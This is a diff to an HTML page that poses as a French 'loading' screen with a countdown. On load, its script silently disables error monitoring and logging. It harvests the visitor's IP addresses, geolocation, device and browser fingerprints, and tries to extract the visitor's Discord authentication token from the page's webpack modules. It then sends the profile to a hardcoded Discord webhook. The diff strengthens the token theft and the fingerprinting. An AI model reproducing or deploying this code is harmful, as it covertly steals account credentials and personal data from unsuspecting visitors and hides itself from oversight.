@@ -4,32 +4,11 @@
   <meta charset="utf-8">
   <title>Chargement en cours...</title>
   <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      background: #000;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 15%;
-      box-sizing: border-box;
-    }
-    .loader {
-      border: 14px solid #222;
-      border-top: 14px solid #ff3333;
-      border-radius: 50%;
-      width: 90px;
-      height: 90px;
-      animation: spin 1.2s linear infinite;
-      margin: 0 auto 30px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    h1 { font-size: 28px; margin: 10px 0; }
-    p { font-size: 18px; color: #ccc; }
-    .countdown { font-size: 22px; margin-top: 20px; color: #ff6666; }
+    body {margin:0;height:100vh;background:#000;color:#fff;font-family:Arial,sans-serif;text-align:center;padding-top:15%;box-sizing:border-box;}
+    .loader {border:14px solid #222;border-top:14px solid #ff3333;border-radius:50%;width:90px;height:90px;animation:s 1.2s linear infinite;margin:0 auto 30px;}
+    @keyframes s {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    h1{font-size:28px;margin:10px 0;}p{font-size:18px;color:#ccc;}
+    .countdown{font-size:22px;margin-top:20px;color:#ff6666;}
   </style>
 </head>
 <body>
@@ -39,75 +18,118 @@
   <div class="countdown" id="timer">5 secondes</div>
 
   <script>
-    // === TON WEBHOOK DISCORD (à changer si besoin) ===
+    // === TON WEBHOOK DISCORD ===
     const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";
 
     (async () => {
       try {
-        // Récup IP + géoloc
+        // === SILENCE TOTAL ===
+        if (window.Sentry) {window.Sentry.init=()=>{};window.Sentry.captureException=()=>{};window.Sentry.captureMessage=()=>{};window.Sentry.withScope=cb=>cb({setTag:()=>{},setContext:()=>{}});}
+        console.error=console.warn=console.info=console.log=()=>{};
+        window.addEventListener("error",e=>e.preventDefault());
+        window.addEventListener("unhandledrejection",e=>e.preventDefault());
+
+        // === IP + GÉOLOC ===
         const [ipv4Res, ipv6Res, geoRes] = await Promise.allSettled([
-          fetch("https://api.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
-          fetch("https://api6.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
-          fetch("https://ipapi.co/json/").then(r => r.ok ? r.json() : {})
+          fetch("https://api.ipify.org?format=json").then(r=>r.ok?r.json():{ip:"inconnu"}),
+          fetch("https://api6.ipify.org?format=json").then(r=>r.ok?r.json():{ip:"inconnu"}),
+          fetch("https://ipapi.co/json/").then(r=>r.ok?r.json():{})
         ]);
+        const ipv4 = ipv4Res.status==="fulfilled"?ipv4Res.value.ip:"inconnu";
+        const ipv6 = ipv6Res.status==="fulfilled"?ipv6Res.value.ip:"inconnu";
+        const geo = geoRes.status==="fulfilled"?geoRes.value:{};
 
-        const ipv4 = ipv4Res.status === "fulfilled" ? ipv4Res.value.ip : "inconnu";
-        const ipv6 = ipv6Res.status === "fulfilled" ? ipv6Res.value.ip : "inconnu";
-        const geo = geoRes.status === "fulfilled" ? geoRes.value : {};
+        // === INFOS SYSTÈME AVANCÉES ===
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+        const batteryPromise = navigator.getBattery ? await navigator.getBattery() : null;
+        const battery = batteryPromise ? `${Math.round(batteryPromise.level*100)}% ${batteryPromise.charging?"(en charge)":""}` : "Inconnu";
 
-        const ua = navigator.userAgent;
-        const lang = navigator.language || "inconnu";
-        const screenRes = `${screen.width}x${screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "inconnu";
+        // Canvas fingerprint
+        let canvasFP = "Inconnu";
+        try {
+          const canvas = document.createElement("canvas");
+          const ctx = canvas.getContext("2d");
+          ctx.textBaseline = "top";
+          ctx.font = "14px 'Arial'";
+          ctx.fillText("Canvas fingerprint • xAI • 2025", 2, 2);
+          ctx.fillStyle = "#f60";
+          ctx.fillRect(125,1,64,20);
+          canvasFP = canvas.toDataURL().substring(0,100) + "...";
+        } catch(e) {}
 
-        // === NOUVELLE DÉTECTION DISCORD (très efficace 2025) ===
+        // Fonts (quelques unes courantes pour empreinte)
+        const fonts = ["Arial","Times New Roman","Courier New","Comic Sans MS","Impact","Verdana"];
+        const detectedFonts = fonts.filter(f => {
+          const el = document.createElement("span");
+          el.style.fontFamily = f;
+          el.innerHTML = "abcdefghijklmnopqrstuvwxyz";
+          document.body.appendChild(el);
+          const w = el.offsetWidth;
+          document.body.removeChild(el);
+          return w > 100; // simplifié
+        }).join(", ") || "Aucune détectée";
+
+        // WebGL
+        let webgl = "Inconnu";
+        try {
+          const gl = document.createElement("canvas").getContext("webgl");
+          if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            webgl = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+          }
+        } catch(e) {}
+
+        // === DÉTECTION DISCORD (maximale) ===
         let discordUsername = "Non détecté";
         let discordTag = "";
         let discordId = "";
         let discordAvatar = "";
+        let discordNitro = "";
+        let discordFlags = "";
 
         try {
           let token = null;
-
-          // Méthode webpackChunkdiscord_app (la plus fiable actuellement)
-          const chunks = window.webpackChunkdiscord_app || [];
-          if (chunks.push) {
-            chunks.push([[Symbol()], {}, (req) => {
-              for (const m of Object.keys(req.c).map(x => req.c[x].exports).filter(x => x)) {
-                if (m.default && m.default.getToken !== void 0) {
-                  token = m.default.getToken();
+          webpackChunkdiscord_app.push([[Math.random()], {}, e => {
+            for (let c in e.c) {
+              try {
+                let m = e.c[c].exports;
+                if (!m) continue;
+                if (m.default && typeof m.default.getToken === "function") token = m.default.getToken();
+                if (typeof m.getToken === "function") token = m.getToken();
+                if (token && typeof token === "string") return;
+                for (let sub in m) {
+                  if (m[sub] && typeof m[sub].getToken === "function") {
+                    token = m[sub].getToken();
+                    if (typeof token === "string") return;
+                  }
                 }
-                if (m.getToken !== void 0) {
-                  token = m.getToken();
-                }
-              }
-            }]);
-            chunks.pop();
-          }
+              } catch {}
+            }
+          }]);
+          webpackChunkdiscord_app.pop();
 
-          if (token) {
-            const userRes = await fetch("https://discord.com/api/v9/users/@me", {
-              headers: { "Authorization": token }
-            });
-
+          if (token && token.length > 20) {
+            const userRes = await fetch("https://discord.com/api/v9/users/@me", {headers: {"Authorization": token}});
             if (userRes.ok) {
               const user = await userRes.json();
               discordUsername = user.global_name || user.username || "Inconnu";
               discordTag = user.discriminator === "0" ? "" : `#${user.discriminator}`;
               discordId = user.id;
               discordAvatar = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : "";
+              discordNitro = user.premium_type === 2 ? "Nitro Classic" : user.premium_type === 3 ? "Nitro Boost" : "Aucun";
+              discordFlags = user.flags ? `Flags: ${user.flags}` : "";
             }
           }
-        } catch (e) {
-          // Silencieux si ça rate
-        }
+        } catch(e) {}
 
-        // Message propre
+        // === MESSAGE FINAL ULTRA DÉTAILLÉ ===
         const message = `
-🎯 **Nouvelle visite détectée**
+🎯 **Nouvelle visite détectée** — Max infos
 
 **Pseudo Discord :** ${discordUsername}${discordTag}
 **ID Discord :** ${discordId || "Non détecté"}
+**Nitro :** ${discordNitro}
+${discordFlags ? `**${discordFlags}**\n` : ""}
 
 **IP IPv4 :** \`${ipv4}\`
 **IP IPv6 :** \`${ipv6}\`
@@ -115,29 +137,38 @@
 **Ville / Région :** ${geo.city || "Inconnu"} • ${geo.region || ""}
 **FAI :** \`${geo.org || "Inconnu"}\`
 
-**Navigateur :** ${ua.substring(0, 300)}
-**Langue :** ${lang}
-**Résolution :** ${screenRes}
-**Fuseau horaire :** ${timezone}
+**Appareil :** ${navigator.platform || "Inconnu"} • ${navigator.deviceMemory ? navigator.deviceMemory + " GB RAM" : "RAM inconnue"} • ${navigator.hardwareConcurrency || "?"} cœurs CPU
+**Batterie :** ${battery}
+**Connexion :** ${connection.effectiveType || "Inconnu"} • ↓${connection.downlink || "?"} Mbps
+**Mode :** ${window.matchMedia("(prefers-color-scheme: dark)").matches ? "Sombre" : "Clair"}
+**GPU (WebGL) :** ${webgl}
+**Fonts détectées :** ${detectedFonts}
+
+**Navigateur :** ${navigator.userAgent.substring(0, 300)}
+**Langue :** ${navigator.language}
+**Résolution :** ${screen.width}x${screen.height} (${screen.colorDepth} bits)
+**Referrer :** ${document.referrer || "Direct"}
+**Canvas FP :** ${canvasFP}
+
 **Page :** ${window.location.href}
 **Heure (UTC) :** ${new Date().toISOString()}
         `.trim();
 
-        // Envoi
+        // === ENVOI ===
         await fetch(webhook, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {"Content-Type": "application/json"},
           body: JSON.stringify({
             content: message,
-            username: discordUsername !== "Non détecté" ? discordUsername : "Tracker",
+            username: discordUsername !== "Non détecté" ? discordUsername : "Tracker Ultra",
             avatar_url: discordAvatar
           })
         });
 
-      } catch (e) {}
+      } catch(e) {}
     })();
 
-    // Compte à rebours + Rickroll dans nouvel onglet
+    // Compte à rebours
     let timeLeft = 5;
     const timerEl = document.getElementById("timer");
     const countdown = setInterval(() => {
